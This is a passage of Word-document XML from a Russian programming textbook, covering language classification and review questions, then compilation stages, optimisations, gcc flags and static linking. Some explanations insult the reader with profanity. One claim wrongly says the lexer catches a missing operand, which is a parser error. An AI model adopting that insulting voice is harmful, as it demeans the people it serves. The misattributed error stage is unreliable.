        <w:t>**Логическое программирование** — описание правил, система находит решение.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Статическая типизация** — проверка типов на этапе компиляции (C, Java, Rust).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Динамическая типизация** — проверка типов во время выполнения (Python, JavaScript).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сильная типизация** — строгие правила типов, минимум неявных преобразований (Python, Rust).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Слабая типизация** — язык разрешает неявные преобразования (JavaScript, PHP).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Type Inference (автовыведение типов)** — компилятор сам определяет типы переменных (Rust, Haskell).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Виртуальная машина (VM)** — программа, выполняющая байт-код (JVM, CLR).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория:** В чём принципиальное отличие компилируемого языка (C++) от интерпретируемого (Python)? Почему игры пишут на C++, а не на Python? (Подсказка: производительность, старт программы.)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практика:** JavaScript — слабо типизированный язык. Что выведет:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```javascript</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   console.log(5 + "5");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   console.log(5 - "5");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   console.log(true + 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   console.log([] == false);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Объясни каждый результат.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сравнение:** Сравни ООП (Java) и функциональное программирование (Haskell). Когда использовать ООП, когда функциональный подход? Приведи примеры задач.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Классификация:** Определи характеристики языков:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Python: компилируемый или интерпретируемый? Статическая или динамическая типизация?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Rust: какая парадигма? Сильная или слабая типизация?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>JavaScript (V8): компилируемый, интерпретируемый или байт-код+JIT?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Стартап хочет создать высоконагруженный веб-сервис (1 млн запросов в день). Выбери язык из: Python, Go, Rust. Обоснуй выбор (скорость разработки vs производительность, команда, экосистема).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итог:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Языков программирования — сотни, но все они классифицируются по уровню абстракции (низкий/высокий), способу исполнения (компиляция/интерпретация/байт-код+JIT), парадигме (императивное/ООП/функциональное/логическое), типизации (статическая/динамическая, сильная/слабая). Нет "лучшего" языка — есть подходящий для задачи. Системное программирование — C/Rust, веб — JavaScript/Python, Data Science — Python, игры — C++/C#. Выбор языка — компромисс между скоростью разработки, производительностью, экосистемой, командой.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Следующая глава (6.2) — компиляторы и интерпретаторы: как код превращается в то, что выполняет процессор. Разберём этапы компиляции, оптимизации, JIT, и почему компиляция C++ проекта может занимать вечность.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 6.2: Языки программирования. Компиляторы и интерпретаторы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В главе 6.1 мы узнали, что языки программирования бывают компилируемые и интерпретируемые. Звучит круто, но что это, блять, значит? Почему C++ нужно компилировать 10 минут, а Python запускается сразу? Почему Java использует JVM, а JavaScript — V8? И почему твой препод всегда говорит "скомпилируй с флагом -O3", как будто это заклинание?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В этой главе разберём, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как код превращается в программу</w:t>
      </w:r>
      <w:r>
        <w:t>, что делают компиляторы и интерпретаторы, и почему одни языки быстрые, а другие — нет (спойлер: дело не только в языке, но и в том, как его выполняют).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.2.1. Компиляция: от кода к машинному коду</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Компиляция</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это процесс перевода программы на языке высокого уровня в машинный код, который процессор может выполнить напрямую. Ты пишешь код, нажимаешь "скомпилировать", ждёшь (иногда очень долго), и на выходе получаешь </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>исполняемый файл</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (.exe, .out, .elf).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Компилятор</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это программа-переводчик, которая делает всю грязную работу за тебя.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Этапы компиляции</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Компиляция — это не "нажал кнопку и готово". Это многоэтапный процесс, и каждый этап может выдать ошибку (и обязательно выдаст, если ты забыл точку с запятой).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>**1. Лексический анализ (токенизация)**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Компилятор читает твой код и разбивает его на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>токены</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — элементарные единицы языка (ключевые слова, переменные, операторы, литералы).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (код на C):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>int x = 5 + 3;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Токены:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[int] [x] [=] [5] [+] [3] [;]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Если ты напишешь `int x = 5 +;`, лексический анализатор скажет: "ты дебил, после `+` должно что-то быть".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>**2. Синтаксический анализ (парсинг, построение AST)**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Компилятор строит </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>дерево абстрактного синтаксиса (AST, Abstract Syntax Tree)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — иерархическое представление кода.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример AST</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для `int x = 5 + 3;`:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Объявление переменной</w:t>
        <w:br/>
        <w:t>├── Тип: int</w:t>
        <w:br/>
        <w:t>├── Имя: x</w:t>
        <w:br/>
        <w:t>└── Инициализация: сложение</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ├── Левый операнд: 5</w:t>
        <w:br/>
        <w:t xml:space="preserve">    └── Правый операнд: 3</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Если ты напишешь `int x = (5 + 3;` (забыл закрыть скобку), парсер скажет: "syntax error".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>**3. Семантический анализ (проверка типов)**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Компилятор проверяет, имеет ли код </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>смысл</w:t>
      </w:r>
      <w:r>
        <w:t>. Например:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Переменная объявлена перед использованием?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Типы совместимы? (нельзя присвоить строку в `int`).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Функция существует?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример ошибки:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>int x = "hello";  // ОШИБКА: нельзя присвоить строку в int</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Компилятор C/C++ скажет что-то вроде:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>error: invalid conversion from 'const char*' to 'int'</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Перевод: "ты еблан, строку в число не впихнёшь".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>**4. Оптимизация**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Компилятор </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>улучшает код</w:t>
      </w:r>
      <w:r>
        <w:t>, чтобы он работал быстрее и занимал меньше памяти. Есть десятки оптимизаций:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры оптимизаций:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">##### </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>a) Constant folding (свёртка констант)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>До оптимизации:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>int x = 2 + 3;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>После оптимизации:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>int x = 5;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Компилятор видит, что `2 + 3` можно вычислить на этапе компиляции, и не генерирует инструкцию сложения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">##### </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>b) Dead code elimination (удаление мёртвого кода)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>До оптимизации:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>int foo() {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    int x = 10;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    int y = 20;  // y не используется</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return x;</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>После оптимизации:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>int foo() {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return 10;</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Компилятор удалил переменную `y` (она не используется) и заменил `x` на константу.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">##### </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>c) Loop unrolling (развёртка циклов)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>До оптимизации:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>for (int i = 0; i &lt; 4; i++) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    sum += arr[i];</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>После оптимизации:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>sum += arr[0];</w:t>
        <w:br/>
        <w:t>sum += arr[1];</w:t>
        <w:br/>
        <w:t>sum += arr[2];</w:t>
        <w:br/>
        <w:t>sum += arr[3];</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Цикл исчез! Компилятор развернул его, чтобы избежать накладных расходов на проверку условия и инкремент `i`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">##### </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>d) Inlining (встраивание функций)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>До оптимизации:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>int square(int x) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return x * x;</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>int main() {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    int a = square(5);</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>После оптимизации:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>int main() {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    int a = 5 * 5;  // функция square встроена</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Компилятор заменил вызов функции её телом. Экономия на вызове функции (push, call, pop).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>**5. Генерация машинного кода**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Компилятор переводит оптимизированное AST в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>машинный код</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для конкретной архитектуры процессора (x86, ARM, RISC-V).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (генерация кода для `int x = 5 + 3;` на x86):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>mov eax, 5       ; загрузить 5 в регистр eax</w:t>
        <w:br/>
        <w:t>add eax, 3       ; прибавить 3</w:t>
        <w:br/>
        <w:t>mov [x], eax     ; сохранить результат в переменную x</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Но если компилятор умный, он сразу сгенерирует:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>mov [x], 8       ; результат вычислен на этапе компиляции</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Флаги оптимизации компилятора</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Компиляторы (GCC, Clang, MSVC) имеют </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>флаги оптимизации</w:t>
      </w:r>
      <w:r>
        <w:t>, которые контролируют, насколько агрессивно компилятор оптимизирует код.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Флаг | Описание | Время компиляции | Скорость выполнения |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|------|----------|-----------------|-------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `-O0` | Без оптимизаций (по умолчанию для отладки) | Быстро | Медленно |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `-O1` | Базовые оптимизации | Средне | Быстрее |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `-O2` | Рекомендуемый уровень (production) | Медленнее | Быстро |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `-O3` | Агрессивные оптимизации (loop unrolling, inlining) | Долго | Очень быстро |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `-Os` | Оптимизация по размеру кода | Средне | Средне |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| `-Ofast` | Максимальная скорость (может нарушать стандарты) | Долго | Максимально быстро |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>gcc -O0 program.c -o program_slow   # без оптимизаций</w:t>
        <w:br/>
        <w:t>gcc -O3 program.c -o program_fast   # максимальная оптимизация</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Разница в скорости</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> может быть в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2-10 раз</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (зависит от кода).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Линковка (Linking)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">После компиляции у тебя есть </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>объектные файлы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (.o, .obj) — это машинный код, но ещё не готовая программа. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Линковщик (linker)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> объединяет все объектные файлы и библиотеки в один исполняемый файл.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Два типа линковки:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>**1. Статическая линковка**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Все библиотеки встраиваются в исполняемый файл. Результат: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>один большой файл</w:t>
      </w:r>
      <w:r>
        <w:t>, который работает везде (не нужны внешние библиотеки).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Программа автономна (нет зависимостей).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Работает даже если библиотека удалена из системы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Большой размер файла.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обновление библиотеки требует перекомпиляции.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>gcc program.c -static -o program   # статическая линковка</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
